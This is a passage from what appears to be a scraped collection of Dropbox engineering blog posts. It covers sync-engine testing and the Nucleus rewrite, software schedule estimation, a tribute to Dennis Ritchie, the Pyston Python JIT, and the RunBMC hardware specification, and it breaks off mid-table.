limitations to how much coverage it can offer. We maintain several other test suites in our CI that run at higher levels of abstraction, which trade off Trinity’s ease of use and performance in order to provide some (admittedly weaker) end-to-end coverage for whatever lies outside Trinity’s scope. But when it comes to testing Nucleus itself, Trinity allows us to deploy our production builds with a level of confidence that we never would have dreamed of with Sync Engine Classic. Conclusion Focusing on testability from the get-go with Nucleus allowed us to build fully deterministic, randomized testing systems like CanopyCheck and Trinity. The target of our rewrite had over a decade to stabilize, meaning we needed to avoid regressing 10+ years of bug fixes. But thanks to these test frameworks we were able to safely get it done. And now, the heart powering Dropbox sync is stronger than ever. ❤️ Special thanks to Ben Blum and Sujay Jayakar for contributions and to Geoff Song, John Lai, Liam Whelan, Gautam Gupta, Iulia Tamas, and the whole Sync team for comments and review. And thanks to all current and past members of the team who’ve contributed to building Nucleus! // Tags Infrastructure Testing Sync // Copy link Link copied Link copied", "date": "2020-04-20"},
{"website": "Dropbox", "title": "Project Schedule Estimation in Software Development", "author": ["Alicia Chen"], "link": "https://dropbox.tech/infrastructure/project-schedule-estimation-in-software-development", "abstract": "The “paint a room” exercise Initial requirements Task breakdown Room painting and software parallels Break down all ambiguities External factors Intercepting bad estimates In tech, we spend little time talking about the softer skills like communication, project management, and prioritization. These are the skills that elevate someone from a good programmer to a great software engineer. Today, I’m going to focus on one aspect of project management that we’re famously bad at — the art of estimating a project schedule. If there’s any doubt that this is a necessary skill, just consider that dreaded but frequently-asked question “How long will it take?” Even if you’re uber-Agile and don’t believe in far-off project deadlines, rest assured that somebody will crack under the pressure and give a date, which your team will be held to. When that date hits and you are not ready to launch, your manager will be angry at you because you made her look like a fool, sales will be angry at you because they promised your most important customers that they could have it today, and your team will be angry at you because they’ve worked five weekends in a row trying to hit an impossible deadline. So let’s just dodge that whole mess and create a schedule that you can live up to. The “paint a room” exercise To demonstrate how this works, I’d like to try an exercise that I’ve shamelessly lifted from an Intro to Development class from Microsoft. The goal is to estimate how long it will take to paint a room. It’s a lesson in the challenges of estimation that doesn’t require specific knowledge about any particular software system. Take some time now before scrolling below to write down your estimate for how long it will take to paint a room. Don’t skip this part — it’s important to record your thoughts as you go to see how they evolve. Done? I hope not, because you barely even know the assignment yet! Start by demanding a spec and then asking some clarifying questions. Initial requirements How big is the room? 12′ x 10′ x 10′, an average-sized bedroom if you’re trying to imagine it. Do you already have the materials you need to paint? No. Is the room fully furnished? Are there a lot of doors, windows, and other things that need to be painted around? Yes, you’ll get pictures. What color is the room now, and what color will you be painting it? It’s currently Kermit green and we want to paint it a very light yellow. Just goes to show that even this seemingly simple task can require a lot of up-front clarification. All right, let’s try this again. Write down your best estimate before reading on. Ready? Here we go. Task breakdown Confirm the requirements. Make sure everyone agrees on the exact color and which walls should get painted, for example. (5 minutes) Research how to paint a room if you don’t already know. You’ll probably learn some important details about primers and how long to wait between coats, for example. Re-confirm any ambiguities with stakeholders — maybe you just learned that paint comes in different glosses. (15 minutes) Make a shopping list and acquire your materials, e.g. paint, rollers, paint trays, brushes, drop cloths, etc. (2 hours) “Prototype” your paint job in a section of the room to make sure the original color isn’t showing through. This could save you a lot of time if, for example, you didn’t think you needed a primer but you do. (10 minutes painting, 2 hour dry time between coats) Remove everything on or near the walls, like paintings, curtains, and light switch covers. Push furniture away from the walls, and cover furniture and floors if painting the ceilings. (30 minutes) Wash your walls and inspect them for any cracked or peeling areas. You’ll want to patch and sand down any of these before you start painting. (1 hour) Secure drop cloths or equivalent, starting at the baseboards so you don’t drip paint on the baseboards or floor. Tape off the edges of all the things you don’t want painted, like windows, doors, and cabinets. (1 hour) Prime the room. (1.5 hours) Allow the primer to dry. (30 minutes if you start painting in the same spot you started priming) Wash primer off any equipment you’ll reuse for painting. (20 minutes, but this can be overlapped with drying time) Apply the paint. (2 hours) Clean up. (30 minutes) OK, let’s take a pause from painting for a minute and step back into the world of software engineering process to note some similarities. Room painting and software parallels Some of these steps may seem silly. Double check the color? But failing to nail down all details of the spec before implementing is a very common mistake, and you might spend a lot of time making something nobody wants. The tiniest difference in the spec (“Oh, you wanted waterproof paint in a different gloss, and only on one wall? Well [a-z]{4}.”) can be very costly to fix afterwards, in this case almost doubling your initial estimate. Without research or a prototype, you could spend a lot of time going down rabbit holes. With a bit of digging, you might find that there’s already a framework that does exactly what you want. A basic prototype might then reveal that the framework documentation was lying or doesn’t cover one crucial scenario, and it doesn’t actually do what you want, and you’ll have to do it yourself after all! If your prototype was very cheap, you just saved yourself the wasted work of integrating the framework into your production system. Then, if you don’t break the tasks down into small enough pieces, you might fail to notice some very important points. For example, if you had forgotten about moving the furniture, you might not have had a second person on hand to move those giant bookshelves (good luck doing that on your own). The more you break things down, the more you realize you overlooked. More importantly, the biggest factor in the accuracy of your estimate is whether or not you’ve done something like this before. Even with extensive research, it’s hard to know how many coats you’ll need in order to paint over that particular color, what your personal painting speed is, or how the humidity in your area affects drying time. In fact, if you’ve done this exact project before, you can skip steps 1 through 4 altogether. But if you haven’t, you were probably repeatedly surprised by steps you’d forgotten to account for, and the prep work will give you a far more accurate estimate than your initial guess. And it does mean that you won’t have a real estimate until you’re done with step 4. Anything you say before that will be a wild guess that you’ll probably have cause to regret later, so it’s safest to say “I don’t know but I can probably tell you in a few days” until then. OK, back to painting. We’ve costed it out and it’s about 12 hours. Are we done? Well…the paint and prime steps have way less detail than the other tasks. Face it, you still don’t actually know how that part will be done, so your estimates are wild guesses. Recursively applying the principles above, let’s break it down more. Break down all ambiguities Prepare the paint by mixing it all into a large bucket. Pour some of it into a paint tray. (15 minutes) Paint edges with a brush, getting into corners and right up to ceilings and doors without coloring anything that isn’t supposed to be yellow. If you do 5 feet of edging in 3 minutes and there’s 210 feet of edging in the room, that’s just over 2 hours. Add another 20 minutes for going up and down a ladder and scooting it around. And if you don’t have a ladder, you’d better add it to the shopping list. (Call the whole thing 2.5 hours) With one dip of a roller, you can probably do a floor-to-ceiling, roller-width section of wall in a couple of passes, so you can probably do a 5 ft wide section in about 10 minutes. (1.5 hours) Your “prototype” will tell you how many coats of paint you’ll need. This could significantly lengthen your paint time, so you should account for that as well. (Multiply by the number of coats, and factor in the drying time). You’ll also realize that priming is not very different than painting. So double this estimate for priming. All tallied up, assuming one coat, that’s about 15 hours for the whole shebang. Phew, that’s a lot longer than we initially thought! And just to be safe, let’s leave a bit of buffer time for unexpected setbacks, like needing to jerry-rig a strainer to remove chunks from your paint. So we’ll make it an even 17 hours. Final answer, let’s get painting, right? Nope, still not there yet! External factors Yeah, you’ve estimated how long it’ll take to paint the room. But that’s not what anyone wants to know. They want to know how long it’ll be before the room is painted. It’s a subtle but important distinction. When I ask about a bug, it’s nice to hear that you can code up a fix in an hour, but what I actually needed to know is that you won’t get around to it until next week, so it’ll be done in a week and an hour! The fact that I technically only asked how long the fix would take is something only an engineer would bother pointing out. -_- So what are we still missing in this estimate? Bathroom and meal breaks, random interruptions, and competing priorities. Your work could be delayed by all kinds of incidents, expected and unexpected. Maybe you had to stop early because it’s laundry day, or some emergency came up. How can you even factor in that kind of unpredictability? The answer is lots of buffering, based on past experience. You can track a multiplier for your estimates by logging how long it actually took you to do each task and comparing your initial schedule with the real time elapsed for the project. Since every project tends to be quite different, you won’t be able to reach fantastic accuracy by refining individual task estimates over time. But a multiplier applied to the whole project will account for everything from your natural optimism, to the fact that you have more meetings than you realized, to the time you spend procrastinating by surfing the internet. I won’t get into greater detail here, because there is already a terrific article on this subject by Joel Spolsky called Evidence Based Scheduling . While his method may sound time-intensive, tracking time sheets for just a couple of projects can help refine your estimates a lot. Like all skills worth improving, this one will take time and effort to hone. Intercepting bad estimates The above is all fine and dandy if you’re asked to give estimates. But as a software engineer, you’re often handed a schedule along with your project. Maybe the deadline was set by marketing because they want it to be available in time for Christmas, or by a manager who needs a date to coordinate with other teams who have their own deadlines. Or maybe they haven’t given you a schedule, but you can tell from the gleam in their eyes that they have Certain Expectations. The important thing is, if you think the dates are unrealistic, you need to speak up. Ideally, each engineer should each be able to estimate his or her part of the project from scratch, rather than anchoring on a schedule someone else has given. It can be easy to convince yourself that you can do a project in two weeks, or at least not question that number too much, if that’s how long your manager or tech lead says. Only when you sit down and do the real work of estimation will you find out how wrong it is. It’s really important to actually do that estimation due diligence early and discuss any unrealistic deadlines. Remember that when you push back against a bad schedule, you are not a Debbie Downer fighting against a magical world where you ship the project by Christmas and everything is awesome. That world doesn’t exist. You simply prefer a world where everyone compromises on the date and feature set and then meets those goals, rather than a world where the deadline gets missed, or gets met by last-minute corner cutting and quality sacrifices, with a generous side of reproach and finger pointing. If your lead or PM really isn’t buying it, maybe point them to the article on Evidence Based Scheduling (really I can’t recommend it enough). Yes, all this sounds like a lot of work. But I assure you, for any project sufficiently important, an accurate schedule will save you a lot of grief. Hopefully, you now have more tools in your toolbelt to create more accurate schedules for future projects! // Tags Infrastructure project management // Copy link Link copied Link copied", "date": "2015-10-25"},
{"website": "Dropbox", "title": "Dennis Ritchie", "author": ["Rian"], "link": "https://dropbox.tech/infrastructure/dennis-richie", "abstract": "Many people spend their lives endlessly searching for the perfect answer to “why?” It stops them early in their tracks and holds them back from reaching their true potential. Then there are those who are confronted with the question “why?” and laugh directly in its face. They interest themselves solely with the “how?” For these people any “why?” will do as long as there is sufficient “how?” associated with it. Dennis Ritchie was one of those people. A fiercely gifted programmer, he relished in the “how?” If you were to ask any common person in these modern times “Why Unix?” Well it would be obvious. Unix because of file systems, because of the internet, because of Windows, because of Mac OS X, because of Linux and software freedom. What about “Why C?” Well that would be obvious too. C because of C++, because of Java, because of Perl, because of Python, the list goes on. But if you were to ask someone “Why Unix?” or “Why C?” in 1972 you’d have a hard time finding an answer, even from Dr. Ritchie himself. The only true answer you’d be able to find would be “For Space Travel” or maybe “For Fun” and little else. People like Dennis Ritchie made it respectful for those who were more interested in the “how?” rather than the “why?” to follow their own path. A programmer could program for the sake of the craft and the art without feeling like she was wasting her time or potential. Sometimes you just want to make something and that should be okay. Programs became works of art rather than slaves to science or utility. And because they were works of art it takes an artist to understand the elegance, the universality, and the eternality of his accomplishments. Unix will be here forever and as much as people would like to say otherwise, the file system will be here forever. I’m sorry to say it but those who don’t yet understand why the file system is the ultimate abstraction still have much to learn. As time has progressed from then to now the works of Dennis Ritchie have taught us that the “why?” doesn’t always have to dictate the “how?” and sometimes the “how?” can dictate the “why?” // Tags Infrastructure // Copy link Link copied Link copied", "date": "2011-10-14"},
{"website": "Dropbox", "title": "Rewriting the heart of our sync engine", "author": ["Sujay Jayakar"], "link": "https://dropbox.tech/infrastructure/rewriting-the-heart-of-our-sync-engine", "abstract": "Sync at scale is hard Why rewrite? A rewrite checklist So, what did we build? Over the past four years, we've been working hard on rebuilding our desktop client's sync engine from scratch. The sync engine is the magic behind the Dropbox folder on your desktop computer, and it's one of the oldest and most important pieces of code at Dropbox. We're proud to announce today that we've shipped this new sync engine (codenamed \"Nucleus\") to all Dropbox users. Rewriting the sync engine was really hard, and we don’t want to blindly celebrate it, because in many environments it would have been a terrible idea. It turned out that this was an excellent idea for Dropbox but only because we were very thoughtful about how we went about this process. In particular, we’re going to share reflections on how to think about a major software rewrite and highlight the key initiatives that made this project a success, like having a very clean data model. To begin, let's rewind the clock to 2008, the year Dropbox sync first entered beta . At first glance, a lot of Dropbox sync looks the same as today. The user installs the Dropbox app, which creates a magic folder on their computer, and putting files in that folder syncs them to Dropbox servers and their other devices. Dropbox servers store files durably and securely, and these files are accessible anywhere with an Internet connection. What’s a sync engine? A sync engine lives on your computer and coordinates uploading and downloading your files to a remote filesystem. Since then we’ve taken file sync pretty far. We started with consumers syncing what fit on their devices for their own personal use. Now, our users bring Dropbox to their jobs, where they have access to millions of files organized in company sharing hierarchies. The content of these files often far exceeds their computer's local disk space, and they can now use Dropbox Smart Sync to download files only when they need them. Dropbox has hundreds of billions of files, trillions of file revisions, and exabytes of customer data. Users access their files across hundreds of millions of devices, all networked in an enormous distributed system. Sync at scale is hard Syncing files becomes much harder at scale, and understanding why is important for understanding why we decided to rewrite. Our first sync engine, which we call ”Sync Engine Classic,” had fundamental issues with its data model that only showed up at scale, and these issues made incremental improvements impossible. Distributed systems are hard The scale of Dropbox alone is a hard systems engineering challenge. But putting raw scale aside, file synchronization is a unique distributed systems problem, because clients are allowed to go offline for long periods of time and reconcile their changes when they return. Network partitions are anomalous conditions for many distributed systems algorithms, yet they are standard operation for us. Getting this right is important: Users trust Dropbox with their most precious content, and keeping it safe is non-negotiable. Bidirectional sync has many corner cases, and durability is harder than just making sure we don’t delete or corrupt data on the server. For example, Sync Engine Classic represents moves as pairs of deletes at the old location and adds at the new location. Consider the case where, due to a transient network hiccup, a delete goes through but its corresponding add does not. Then, the user would see the file missing on the server and their other devices, even though they only moved it locally. Durability everywhere is hard Dropbox also aims to “just work” on users’ computers, no matter their configuration. We support Windows, macOS, and Linux, and each of these platforms has a variety of filesystems, all with slightly different behavior . Under the operating system, there's enormous variation in hardware, and users also install different kernel extensions or drivers that change the behavior within the operating system. And above Dropbox, applications all use the filesystem in different ways and rely on behavior that may not actually be part of its specification. Guaranteeing durability in a particular environment requires understanding its implementation, mitigating its bugs, and sometimes even reverse-engineering it when debugging production issues. These issues often only show up in large populations, since a rare filesystem bug may only affect a very small fraction of users. So at scale, “just working” across many environments and providing strong durability guarantees are fundamentally opposed. Testing file sync is hard With a sufficiently large user base, just about anything that’s theoretically possible will happen in production. Debugging issues in production is much more expensive than finding them in development, especially for software that runs on users’ devices. So, catching regressions with automated testing before they hit production is critical at scale. However, testing sync engines well is difficult since the number of possible combinations of file states and user actions is astronomical. A shared folder may have thousands of members, each with a sync engine with varied connectivity and a differently out-of-date view of the Dropbox filesystem. Every user may have different local changes that are pending upload, and they may have different partial progress for downloading files from the server. Therefore, there are many possible “snapshots” of the system, all of which we must test. The number of valid actions to take from a system state is also tremendously large. Syncing files is a heavily concurrent process, where the user may be simultaneously uploading and downloading many files at the same time. Syncing an individual file may involve transferring content chunks in parallel, writing contents to disk, or reading from the local filesystem. Comprehensive testing requires trying different sequences of these actions to ensure our system is free of concurrency bugs. Specifying sync behavior is hard Finally, if the large state space wasn’t bad enough, it’s often hard to precisely define correct behavior for a sync engine. For example, consider the case where we have three folders with one nested inside another. Then, let’s say we have two users—Alberto and Beatrice—who are working within this folder offline. Alberto moves “Archives” into “January,” and Beatrice moves “Drafts” into “Archives.” What should happen when they both come back online? If we apply these moves directly, we’ll have a cycle in our filesystem graph: “Archives” is the parent of “Drafts,” “Drafts” is the parent of “January,” and “January” is the parent of “Archives.” What’s the correct final system state in this situation? Sync Engine Classic duplicates each directory, merging Alberto’s and Beatrice’s directory trees. With Nucleus we keep the original directories, and the final order depends on which sync engine uploads their move first. In this simple situation with three folders and two moves, Nucleus has a satisfying final state. But how do we specify sync behavior in general without drowning in a list of corner cases? Why rewrite? Okay, so syncing files at scale is hard. Back in 2016, it looked like we had solved that problem pretty well. We had hundreds of millions of users, new product features like Smart Sync on the way, and a strong team of sync experts. Sync Engine Classic had years of production hardening, and we had spent time hunting down and fixing even the rarest bugs. Joel Spolsky called rewriting code from scratch the \" single worst strategic mistake that any software company can make. \" Successfully pulling off a rewrite often requires slowing feature development, since progress made on the old system needs to be ported over to the new one. And, of course, there were plenty of user-facing projects our sync engineers could have worked on. But despite its success, Sync Engine Classic was deeply unhealthy. In the course of building Smart Sync, we'd made many incremental improvements to the system, cleaning up ugly code, refactoring interfaces, and even adding Python type annotations. We'd added copious telemetry and built processes for ensuring maintenance was safe and easy. However, these incremental improvements weren’t enough. Shipping any change to sync behavior required an arduous rollout, and we'd still find complex inconsistencies in production. The team would have to drop everything, diagnose the issue, fix it, and then spend time getting their apps back into a good state. Even though we had a strong team of experts, onboarding new engineers to the system took years. Finally, we poured time into incremental performance wins but failed to appreciably scale the total number of files the sync engine could manage. There were a few root causes for these issues, but the most important one was Sync Engine Classic's data model . The data model was designed for a simpler world without sharing, and files lacked a stable identifier that would be preserved across moves. There were few consistency guarantees, and we'd spend hours debugging issues where something theoretically possible but \"extremely unlikely\" would show up in production. Changing the foundational nouns of a system is often impossible to do in small pieces, and we quickly ran out of effective incremental improvements. Next, the system was not designed for testability. We relied on slow rollouts and debugging issues in the field rather than automated pre-release testing. Sync Engine Classic’s permissive data model meant we couldn't check much in stress tests, since there were large sets of undesirable yet still legal outcomes we couldn't assert against. Having a strong data model with tight invariants is immensely valuable for testing, since it's always easy to check if your system is in a valid state. We discussed above how sync is a very concurrent problem, and testing and debugging concurrent code is notoriously difficult . Sync Engine Classic’s threading-based architecture did not help at all, handing all our scheduling decisions to the OS and making integration tests non-reproducible. In practice, we ended up using very coarse-grained locks held for long periods of time. This architecture sacrificed the benefits of parallelism in order to make the system easier to reason about. A rewrite checklist Let’s distill the reasons for our decision to rewrite into a “rewrite checklist” that can help navigate this kind of decision for other systems. Have you exhausted incremental improvements? □ Have you tried refactoring code into better modules? Poor code quality alone isn't a great reason to rewrite a system. Renaming variables and untangling intertwined modules can all be done incrementally, and we spent a lot of time doing this with Sync Engine Classic. Python's dynamism can make this difficult, so we added MyPy annotations as we went to gradually catch more bugs at compile time. But the core primitives of the system remained the same, as refactoring alone cannot change the fundamental data model. □ Have you tried improving performance by optimizing hotspots? Software often spends most of its time in very little of the code. Many performance issues are not fundamental, and optimizing hotspots identified by a profiler is a great way to incrementally improve performance. We had a team working on performance and scale for months, and they had great results for improving file content transfer performance. But improvements to our memory footprint, like increasing the number of files the system could manage, remained elusive. □ Can you deliver incremental value? Even if you decide to do a rewrite, can you reduce its risk by delivering intermediate value?  Doing so can validate early technical decisions, help the project keep momentum, and lessen the pain of slowed feature development. Can you pull off a rewrite? □ Do you deeply understand and respect the current system? It's much easier to write new code than fully understand existing code. So, before embarking on a rewrite, you must deeply understand and respect the “Classic” system. It's the whole reason your team and business is here, and it has years of accumulated wisdom through running in production. Get in there and do archaeology to dig into why everything is the way it is. □ Do you have the engineering-hours? Rewriting a system from scratch is hard work, and getting to full feature completeness will require a lot of time. Do you have these resources? Do you have the domain experts who understand the current system? Is your organization healthy enough to sustain a project of this magnitude? □ Can you accept a slower rate of feature development? We didn't completely pause feature development on Sync Engine Classic, but every change on the old system pushed the finish line for the new one further out. We decided on shipping a few projects, and we had to be very intentional about allocating resources for guiding their rollouts without slowing down the rewriting team. We also heavily invested in telemetry for Sync Engine Classic to keep its steady-state maintenance cost to a minimum. Do you know what you're going towards? □ Why will it be better the second time? If you've gotten to here, you already understand the old system thoroughly and its lessons to be learned. But a rewrite should also be motivated by changing requirements or business needs. We described earlier how file syncing had changed, but our decision to rewrite was also forward looking. Dropbox understands the growing needs of collaborative users at work, and building new features for these users requires a flexible, robust sync engine. □ What are your principles for the new system? Starting from scratch is a great opportunity to reset technical culture for a team. Given our experience operating Sync Engine Classic, we heavily emphasized testing, correctness, and debuggability from the beginning.  Encode all of these principles in your data model.  We wrote out these principles early in the project's lifespan, and they paid for themselves over and over. So, what did we build? Here’s a summary of what we achieved with Nucleus. For more details on each one, stay tuned for future blog posts. We wrote Nucleus in Rust! Rust has been a force multiplier for our team, and betting on Rust was one of the best decisions we made. More than performance, its ergonomics and focus on correctness has helped us tame sync’s complexity. We can encode complex invariants about our system in the type system and have the compiler check them for us. Almost all of our code runs on a single thread (the “Control thread”) and uses Rust’s futures library for scheduling many concurrent actions on this single thread. We offload work to other threads only as needed: network IO to an event loop, computationally expensive work like hashing to a thread pool, and filesystem IO to a dedicated thread. This drastically reduces the scope and complexity developers must consider when adding new features. The Control thread is designed to be entirely deterministic when its inputs and scheduling decisions are fixed. We use this property to fuzz it with pseudorandom simulation testing. With a seed for our random number generator, we can generate random initial filesystem state, schedules, and system perturbations and let the engine run to completion. Then, if we fail any of our sync correctness checks, we can always reproduce the bug from the original seed. We run millions of scenarios every day in our testing infrastructure. We redesigned the client-server protocol to have strong consistency. The protocol guarantees the server and client have the same view of the remote filesystem before considering a mutation. Shared folders and files have globally unique identifiers, and clients never observe them in transiently duplicated or missing states. Finally, folders and files support atomic moves independent of their subtree size. We now have strong consistency checks between the client’s and server’s view of the remote filesystem, and any discrepancy is a bug. If you’re interested in working on hard systems problems in Rust, we’re hiring for our core sync team. Thanks to Ben Blum, Anthony Kosner, James Cowling, Josh Warner, Iulia Tamas, and the Sync team for comments and review.  And thanks to all current and past members of the Sync team who’ve contributed to building Nucleus. // Tags Infrastructure Performance Sync // Copy link Link copied Link copied", "date": "2020-03-09"},
{"website": "Dropbox", "title": "Introducing Pyston: an upcoming, JIT-based Python implementation", "author": ["Kevin Modzelewski"], "link": "https://dropbox.tech/infrastructure/introducing-pyston-an-upcoming-jit-based-python-implementation", "abstract": "Hello everyone, I’m very excited to announce Pyston, a new open-source implementation of Python, currently under development at Dropbox.  The goal of the project is to produce a high-performance Python implementation that can push Python into domains dominated by traditional systems languages like C++. Here at Dropbox, we love Python and try to use it for as much as we can.  As we scale and the problems we tackle grow, though, we’re starting to find that hitting our performance targets can sometimes become prohibitively difficult when staying on Python.  Sometimes, it can be less work to do a rewrite in another language.  I personally love Python, and it pains me every time we decide to rewrite something, so I wanted to do something about it.  After some abandoned experiments with static compilation, we looked around and saw how successfully JIT techniques are being applied in the JavaScript space: Chrome’s V8 engine, in particular, has greatly pushed the status quo of JavaScript performance.  Our hope is that by using similar techniques, we can achieve similar performance improvements for Python. Pyston is still in the earliest stages and is not ready for use, but we’re hopeful that by announcing it early in its lifecycle and open-sourcing the code , we can collaborate with the Python and JIT communities throughout its development.  There’s only room for so much detail in this blog post, but we wanted to talk about why we think we need a new Python implementation, and go into a little bit of how Pyston works. Why a new implementation There are already a number of Python implementations using JIT techniques, often in sophisticated ways. PyPy has achieved impressive performance with its tracing JIT; Jython and IronPython are both built on top of mature VMs with extensive JIT support.  So why do we think it’s worth starting a new implementation? In short, it’s because we think the most promising techniques are incompatible with existing implementations.  For instance, the JavaScript world has switched from tracing JITs to method-at-a-time JITs, due to the compelling performance benefits.  Whether or not the same performance advantage holds for Python is an open question, but since the two approaches are fundamentally incompatible, the only way to start answering the question is to build a new method-at-a-time JIT. Another point of differentiation is the planned use of a conservative garbage collector to support extension modules efficiently . Again, we won’t know until later whether this is a better approach or not, but it’s a decision that’s integral enough to a JIT that it is difficult to test in an existing implementation. The downside of starting from scratch is, unsurprisingly, that creating a new language implementation is an enormous task. Luckily, tools are starting to come out that can help with this process; in particular, Pyston is built on top of LLVM , which lets us achieve top-tier code generation quality without having to deal with the details ourselves. Nonetheless, a new Python implementation is a huge undertaking, and Pyston will not be ready for use soon. How it works At a high level, Pyston takes parsed Python code and transforms it to the LLVM intermediate representation (IR).  The IR is then run through the LLVM optimizer and passed off to the LLVM JIT engine, resulting in executable machine code.  LLVM contains a large number of optimization passes and mechanisms for easily adding more, which can lead to very fast code. The problem, though, is that LLVM can’t reason about Python code, because all the low-level behavior is hidden behind the type dispatching you have to do in any dynamic language.  To handle this, Pyston employs type speculation: it is typically impossible to prove that a variable will have a specific type, but Pyston can often predict with some certainty what the type of an object can be.  Once a prediction is made, Pyston will verify the prediction at runtime, branching between a fast path where the prediction holds, and a slow path where it doesn’t. Pyston also includes other modern techniques such as hidden classes for fast attribute lookups and inline caches for fast method calls.  You can find more technical details on the Github page , along with a separate blog post that goes into more technical detail. Current state Pyston is still in its infancy and right now only supports a minimal subset of the Python language.  It’s not quite fair to state benchmark numbers, since 1) Pyston doesn’t support a large enough set of benchmarks to be representative, and 2) Pyston doesn’t support all runtime features (including ones that might introduce slowdowns), so it’s not a true apples-to-apples comparison.  With those caveats, Pyston generally is able to beat CPython’s performance, but still lags behind PyPy. The code has been released on Github under the Apache 2.0 license, along with a growing amount of technical documentation.  There’s a lot of work to be done, and we’re looking to grow the team: if this kind of thing interests you, please apply ! // Tags Infrastructure Jit Python Open Source Pyston // Copy link Link copied Link copied", "date": "2014-04-03"},
{"website": "Dropbox", "title": "RunBMC: OCP hardware spec solves data center BMC pain points", "author": ["Eric Shobe"], "link": "https://dropbox.tech/infrastructure/runbmc-ocp-hardware-spec-solves-data-center-bmc-pain-points", "abstract": "Open source is not just for software. The same benefits of rapid innovation and community validation apply to hardware specifications as well. That’s why I’m happy to write that the v1.0 of the RunBMC hardware spec has been contributed to Open Compute Project (OCP). Before I get into what BMCs (baseboard management controllers) are and why modern data centers are dependent on them, let’s zoom out to what companies operating at cloud scale have learned. Cloud software companies like Dropbox have millions, and in some cases, billions of users. When these cloud companies started building out their own data centers, they encountered new challenges with reliability, maintainability, security, and cost operating at such massive scale. Many solutions involved improvements to how operating, monitoring, and repairing machines at scale is performed. The open data center Large open source projects have a security advantage over closed source, because there are more people testing—and then fixing—the code. The operating system that virtually all cloud data centers run on is Linux, the world’s largest open source project. The Open Compute Project was founded in 2011 to create a community to share and develop open source designs and specifications for data center hardware. Historically, companies had to work directly with vendors to independently optimize and customize their systems. As the size and complexity of these systems has grown, the benefits of collaborating freely and breaking open the black box of proprietary IT infrastructure have also grown. With OCP, contributors to the community can now help design commodity hardware that is more efficient, flexible, secure, and scalable. Dropbox recently joined OCP and presented the RunBMC specification at the 2019 OCP S ummit . Five years ago when Facebook was designing a new data center switch, open source hadn’t yet reached the baseboard management controller. The BMC is a small hardware component that serves as the brains behind the Intelligent Platform Management Interface (IPMI) which specifies how sysadmins can perform out-of-band management and monitoring of their systems. BMCs do a lot of telemetry on servers like checking temperature ranges, voltage, current, and other kinds of health checks. Admins typically monitor these statistics through IPMI, issuing commands through a network topology that's separate and insulated from the communication between the server’s CPU, firmware, and operating system. The problem is, there are a ton of security vulnerabilities in the IPMI stack, and that stack has historically been a black box of closed source software. The Facebook engineers realized that the best way to confront these risks, and to write more maintainable code, was to open up the software that runs on BMCs and reduce the surface area for vulnerabilities. What they found was a lot of bugs and a lot of bloat caused by unnecessary features that had accumulated over time. Instead of fixing all the bugs, they decided to start over and write a new stack on top of one of the baseboard development packages that chip vendors make available. OpenBMC , the resulting open source project, started at a 2014 Facebook hackathon to solve scaling challenges for the new switch. From there it has grown into a larger project supported by IBM, Intel, Google, Microsoft, and Facebook that not only addresses the needs of cloud providers, but also enterprise, telco, and high-performance computing (HPC) data centers as well. OpenBMC provides a common software management stack for BMCs, which has been a big win for people designing data centers, but we thought a common hardware approach could do even more. With RunBMC, we now have a hardware specification that defines the interface between BMC subsystems and the compute platforms they need to manage. This post describes how we got there. BMC hardware The BMC is usually built into a system on a chip (SOC), and a lot of the functionality that's provided is common across systems. You have RMII and RGMII to provide Ethernet interfaces; some type of boot flash over SPI NOR; various IOs to toggle devices; PCI Express and LPC to talk to the host, and a lot more. Taking a closer look at schematics, layouts, and systems, we performed a deep dive into many of the OCP BMC sub-systems, and tried to understand how they are being used in different implementations. How are they the same, how are they different, and what are the requirements that would drive towards a standard for all OCP platforms? We came up with some different types of ideas for inputs, outputs, interrupts, serial buses, etc., until we could ask, What is the ideal interface all platforms could leverage? BMC system topologies look very similar, but once you dig into the details, they deviate on a platform by platform basis. And all these variances trickle down into code and management challenges, and over time your software stack becomes more complex. Once you standardize the hardware interface, you have consistent interfaces which can drive more consistent software. Open source with benefits Based on this analysis, we developed the first prototype and presented it at the 2018 OCP Summit . The prototype had a super high-density connector with a super small pitch, and it generated a lot of interest. Sharing that prototype at OCP really started the conversation and drove the project forward to where we are today. Through the OCP community we were able to connect with a very wide audience to refine our concept. Based on all of this feedback, we’ve identified the biggest wins for RunBMC. Security There’s a proliferation of hardware devices and SKUs in contemporary data centers, all with different BMCs. Last summer’s controversies over potential hardware vulnerabilities built into server networks have people paying close attention to the BMC subsystem. Having a standardized BMC interface will enable companies to “lock down” their BMC subsystem. Having a design that's more stable, that rolls at a slower cadence than compute platforms, lets you harden your BMC. It’s really difficult in that environment to control everything and guard against vulnerabilities like man in the middle attacks. By focusing security efforts on a single BMC card, system designers can standardize their own software management stack. Modularizing the BMC subsystem will also make it easier for designers to add hardware security features to the module. You can harden anything that's prone to attack, like the BIOS flash, by adding peripherals like a Titan, Cerberus, or TPM security chip that monitors all the traffic going back and forth from the IO to the reference board. Supply chain Imagine designing a server and going to the OCP marketplace and picking from two or three BMCs and being able to place an order for a million of them. For some of the larger cloud companies, that’s a very attractive scenario. The other important point here is that when the industry adopts these open hardware standards, they drive down cost and complexity for everyone else. Dropbox may not be the first in line to put RunBMC into production, but when we do, we’ll benefit from the economies of scale created by the companies that were first in line. Faster industry innovation One of the things that’s been particularly exciting and gratifying about this project is to see how quickly hardware companies have embraced it. At the OCP Global Summit there was multiple booths showing next generation servers supporting RunBMC. So not only does this kind of open innovation have downstream supply chain benefits across the industry, it also allows relatively small players like Dropbox to have positive impact on the hardware designs of much bigger players in our industry. The RunBMC specification The RunBMC specification defines the interface between BMCs and their respective platform. In the image below the double arrow shows all the IO connectivity that we've standardized, and this should cover 95-99% of platform BMC requirements. The spec uses a 260 pin DDR SO-DIMM connector with relaxations in some of the dimensions. This form factor can fit vertically in a 1RU, or 2RU form factor servers, but you can also find connectors that are right angles and different type of angles. So there’s a lot of flexibility in the placement inside platforms. The image below shows the interfaces in the specification. RGMII, RMII, LPC, eSPI, PCI Express, USB, as well as various serial interfaces and GPIOs, ADCs, PWMs, and TACHs are all provided through the RunBMC interface. Function Signal Count for Interface Number of Interfaces Number of used pins Form Factor - 260 SO-DIMM4 Power 3.3V 5 VDD_RGMII_REF 1 LPC 3.3v or ESPI 1.8v 1 Power 12 V 1 Ground 38 ADC 1 8 8 GPI/ADC 1 8 8 PCIe 7 1 7 RGMII/1GT PHY 14 1 14 VGA / GPIOs 7 1 7 RMII/NC-SI 10 1 10 Master JTAG/GPIO 6 1 6 USB host 4 1 4 USB device 3 1 3 SPI1: SPI for host - quad capable 7 1 7 SPI2: SPI for host 5 1 5 FWSPI: SPI for Boot - quad capable 7 1 7 SYSSPI: System SPI 4 1 4 LPC/eSPI 8 